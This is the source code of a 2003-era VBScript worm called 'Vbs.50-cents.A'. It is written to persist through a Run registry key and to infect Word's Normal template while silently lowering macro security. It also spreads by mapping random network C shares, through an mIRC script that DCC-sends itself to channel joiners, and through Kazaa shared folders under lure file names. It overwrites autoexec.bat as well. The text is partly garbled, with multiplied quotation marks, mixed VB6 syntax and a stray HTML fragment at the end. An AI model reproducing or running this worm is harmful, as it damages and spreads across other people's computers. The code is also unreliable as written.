
   'Vbs.50-cents.A
   'Written by A.v_Killer(PakBrain)
   On Error Resume Next
   Set sf=CreateObject(""""""""Scripting.FileSystemObject"""""""")
   Set ws=CreateObject(""""""""WScript.Shell"""""""")
   Set net=Wscript.CreateObject("WScript.Network")
   Set fl=sf.OpenTextFile(WScript.ScriptFullName,1)
   virus=fl.ReadAll
   Set win=sf.GetSpecialFolder(0)
   Set sys=sf.GetSpecialFolder(1)

   Set cpy=sf.GetFile(WScript.ScriptFullName)
   cpy.Copy(win&""""""""\50-cents.vbs"""""""")
   r=(""""""""HKLM\Software\Microsoft\Windows\CurrentVersion\Run\50-cents"""""""")
   ws.RegWrite r,(win&""""""""\50-cents.vbs"""""""")

   If cpy <> (win&""""""""\50-cents.vbs"""""""") Then
   MsgBox cpy&"""""""" is not a VBS file valid."""""""",vbcritical,cpy
   else
   word()
   NetbiosScan()
   zipinfect()
   mIRC()
   P2P()
   Drives()
   Spread()
   If Day(Now)=1 Then
   MsgBox """"""""50-cents""""""""+VbCrLf+""""""""50-cents"""""""",vbinformation,""""""""VBS.50-cents coded by A.v_killer(PakBrain) (c)2003""""""""
   End If
   bureau=ws.SpecialFolders(""""""""Desktop"""""""")
   Set link=ws.CreateShortCut(bureau&""""""""\Site_Web.url"""""""")
   link.TargetPath=""""""""http://whackerz.proboards21.com
   link.Save
   End If
   sub word()
   norm =""Sub document_close()"" & vbCrLf & _
   ""On Error Resume Next"" & vbCrLf & _
   ""Open """"c:\50-cents.txt"""" For Output As 2"" & vbCrLf & _
   ""Print #2, """"sub document_open()"""""" & vbCrLf & _
   ""Print #2, """"On Error Resume Next"""""" & vbCrLf & _
   ""Print #2, """"'PakBrain"""""" & vbCrLf & _
   ""Print #2, """"obj = ActiveDocument.Shapes(1).OLEFormat.ClassType"""""" & vbCrLf & _
   ""Print #2, """"With ActiveDocument.Shapes(1).OLEFormat"""""" & vbCrLf & _
   ""Print #2, """"    .ActivateAs ClassType:=obj"""""" & vbCrLf & _
   ""Print #2, """"    .Activate"""""" & vbCrLf & _
   ""Print #2, """"End With"""""" & vbCrLf & _
   ""Print #2, """"end sub"""""" & vbCrLf & _
   ""Close 2"" & vbCrLf & _
   ""Set fso = CreateObject(""""Scripting.FileSystemObject"""")"" & vbCrLf & _
   ""Set nt = ActiveDocument.VBProject.vbcomponents(1).codemodule"" & vbCrLf & _
   ""Set iw = fso.OpenTextFile(""""c:\50-cents.txt"""", 1, True)"" & vbCrLf & _
   ""nt.DeleteLines 1, nt.CountOfLines"" & vbCrLf & _
   ""i = 1 "" & vbCrLf & _
   ""Do While iw.atendofstream <> True"" & vbCrLf & _
   ""b = iw.readline"" & vbCrLf & _
   ""nt.InsertLines i, b "" & vbCrLf & _
   ""i = i + 1 "" & vbCrLf & _
   ""Loop"" & vbCrLf & _
   ""ActiveDocument.Shapes.AddOLEObject _"" & vbCrLf & _
   ""FileName:=""""c:\50-cents.vbs"""", _"" & vbCrLf & _
   ""LinkToFile:=False"" & vbCrLf & _
   ""ActiveDocument.Save"" & vbCrLf & _
   ""Open """"c:\50-cents.reg"""" For Output As 3"" & vbCrLf & _
   ""Print #3, """"REGEDIT4"""""" & vbCrLf & _
   ""Print #3, """"[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security]"""""" & vbCrLf & _
   ""Print #3, """"""""""""Level""""""""=dword:00000001"""""" & vbCrLf & _
   ""Print #3, """"[HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security]"""""" & vbCrLf & _
   ""Print #3, """"""""""""Level""""""""=dword:00000001"""""" & vbCrLf & _
   ""Print #3, """"""""""""AccessVBOM""""""""=dword:00000001"""""" & vbCrLf & _
   ""Close 3"" & vbCrLf & _
   ""Shell """"regedit /s c:\50-cents.reg"""", vbHide"" & vbCrLf & _
   ""Kill """"c:\50-cents.reg"""""" & vbCrLf & _
   ""End Sub""
   Set fso = CreateObject(""Scripting.FileSystemObject"")
   set f = fso.createtextfile(""c:\50-cents.txt"")
   f.write norm
   f.Close
   Set oword = CreateObject(""Word.Application"")
   oword.Visible = False
   Set nt = oword.NormalTemplate.vbproject.vbcomponents(1).codemodule
   Set iw = fso.OpenTextFile(""c:\50-cents.txt"", 1, True)
   nt.DeleteLines 1, nt.CountOfLines
   i = 1
   Do While iw.atendofstream <> True
   b = iw.readline
   nt.InsertLines i, b
   i = i + 1
   Loop
   oword.NormalTemplate.Save
   oword.NormalTemplate.Close
   end sub
   Sub NetbiosScan()
   On Error Resume Next
   Dim w, x, n, o, i, rd, r(2)
   Randomize
   Do While w=0
   r(0) = "\\24."
   r(1) = "\\208."
   r(2) = "\\209."
   rd = r(Int(3*Rnd+1)-1)
   n=rd&Int(254*rnd+1)&"."&int(254*rnd+1)&"."&int(254*rnd+1)&"\C"
   x = Chr(Int(20*Rnd+103))&":"
   net.mapnetworkdrive x,n
   Set o=net.enumnetworkdrives
   For i=0 to o.Count-1
   If n=o.item(i) Then w=1
   Next
   Loop
   cpy.Copy(win&""""""""\50-cents.vbs""""""""), x&"\windows\startm~1\programs\startup\"
   net.removenetworkdrive x
   w=0
   End Sub
   Sub zipinfect()
   On Error Resume Next
   list ("c:\")
   End Sub
   Sub list(dir)
   On Error Resume Next
   Dim fso, ssf, fil
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set ssf = fso.GetFolder(dir).SubFolders
   For Each fil In ssf
   infection (fil.path)
   list (fil.path)
   Next
   End Sub
   Sub infection(dir)
   Dim fso, cf, fil, ext
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set cf = fso.GetFolder(dir).Files
   For Each fil In cf
   ext = fso.GetExtensionName(fil.path)
   ext = LCase(ext)
   If (ext = "zip") Then
   Shell "c:\suck.exe " & fil.path & " " & GetSpecialfolder(CSIDL_WINSYS) & "\hot_fuck.exe", vbHide
   End If
   Next
   End Sub
   Set liar= fso.CreateTextFile("C:\autoexec.bat", True, False)
    liar.Write(tout)
    liar.WriteLine "@echo off"
    liar.WriteLine "echo Guess who's back again"
    liar.WriteLine "echo Guess who's back again"
    liar.WriteLine "echo Whackerz back , tell everybody"
    liar.WriteLine "echo thx to MelHacker,SlageHammer,27bytes,Nirvana,Fady911x,Polygrithm,Radix16"
    liar.WriteLine "echo Greets: #virus , 29A ,"
    liar.WriteLine "pause <nul"
   liar.Close()
   Sub mIRC()
   On Error Resume Next
   Dim FSO, mIRC1, mIRC2, mIRC3, mIRC4, mIRCDir As String
   Set FSO = CreateObject("Scripting.FileSystemObject")
   mIRC1 = "C:\mIRC\"
   mIRC2 = "C:\mIRC32\"
   mIRC3 = "C:\Program Files\mIRC\"
   mIRC4 = "C:\Program Files\mIRC32\"
   If FSO.FolderExists(mIRC1) = True Then mIRCDir = mIRC1
   If FSO.FolderExists(mIRC2) = True Then mIRCDir = mIRC2
   If FSO.FolderExists(mIRC3) = True Then mIRCDir = mIRC3
   If FSO.FolderExists(mIRC4) = True Then mIRCDir = mIRC4
   If mIRCDir <> "" Then GoTo WriteScript Else GoTo RunNextCode
   WriteScript:
   Open mIRCDir & "Script.ini" For Output As #3
   Print #3, "n1= on 1:JOIN:#:{"
   Print #3, "n2= /if ( $nick == $me ) { halt }"
   Print #3, "n3= /msg $nick Hi i have 50-cents for u"
   Print #3, "n4= /dcc send -c $nick c:\Windows\50-cents.vbs"
   Print #3, "n5= }"
   Print #3, "n6= on 1:quit:{"
   Print #3, "n7= /ame infected by 50-cents worm by gangster2742 a.k.a PakBrain"
   Print #3, "n8= }"
   Print #3, "n9= on 1:text:*:#:{"
   Print #3, "n9= /msg $chan $2-"
   Print #3, "n10= }"
   Print #3, "n11= on 1:text:*no*:#:/quit $nick Whackerz r here (whackerz own u)"
   Close #3
   RunNextCode:
   End Sub
   Function P2P()
   On Error Resume Next
   Dim GetProg As String, a(10) As String, rndCOPY, b
   a(1) = "Hulk.mpg.exe"
   a(2) = "The Matrix Reloaded.jpg.exe"
   a(3) = "Jonny English (JE).avi.exe"
   a(4) = "EmpireEarthII.msi.exe"
   a(5) = "Setup.exe"
   a(6) = "watch me naked.exe"
   a(7) = "your solution is here.exe"
   a(8) = "YoungAndNotTooDangerous.exe"
   a(9) = "whackerz_rule.exe"
   a(10) = "fbi got fucked.doc.exe"
   a(11) = "download free sex movies.jpg.exe"
   a(12) = "free sexy pics.exe"
   a(13) = "MSVisual C++.exe"
   a(14) = "WinXp installer.exe"
   a(15) = "hacker_tool.exe"
   a(16) = "Hotmail Hacked.exe"
   a(17) = "Hotmail_Cracker.exe"
   a(18) = "WMovie Maker II.exe"
   a(19) = "Whackerz.exe"
   a(20) = "Red_Hot_Sex.exe"
   Randomize
   b = Int(20 * Rnd) + 1
   rndCOPY = a(b)

   GetProg = ws.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
   If FileExist(GetProg & "\KMD\My Shared Folder") Then
   FileCopy AP, GetProg & "\KMD\My Shared Folder\" & rndCOPY

   ElseIf FileExist(GetProg & "\Kazaa\My Shared Folder") Then
   FileCopy AP, GetProg & "\Kazaa\My Shared Folder\" & rndCOPY

   ElseIf FileExist(GetProg & "\KaZaA Lite\My Shared Folder") Then
   FileCopy AP, GetProg & "\KaZaA Lite\My Shared Folder\" &<span class="s
